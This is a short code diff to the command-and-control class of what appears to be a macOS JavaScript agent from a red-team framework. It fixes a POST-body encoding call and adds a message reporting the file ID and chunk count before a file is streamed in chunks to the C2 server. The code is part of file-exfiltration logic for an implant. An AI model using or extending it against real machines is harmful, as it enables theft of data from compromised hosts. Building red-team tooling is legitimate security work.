@@ -334,7 +334,7 @@ class customC2 extends baseC2{
         }
         if(method === "POST") {
             req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
-            let postData = $(body).dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
+            let postData = $(body).dataUsingEncodingAllowLossyConversion($.NSASCIIStringEncoding, true);
             let postLength = $.NSString.stringWithFormat("%d", postData.length);
             req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
             req.setHTTPBody(postData);
@@ -477,6 +477,10 @@ class customC2 extends baseC2{
         if (registerFile['responses'][0]['status'] === "success"){
             handle.seekToFileOffset(0);
             let currentChunk = 1;
+            this.postResponse(task, {"user_output": JSON.stringify({
+						"agent_file_id": registerFile["file_id"],
+						"total_chunks": numOfChunks
+					})});
             let data = handle.readDataOfLength(chunkSize);
             while(parseInt(data.length) > 0 && offset < fileSize){
                 // send a chunk
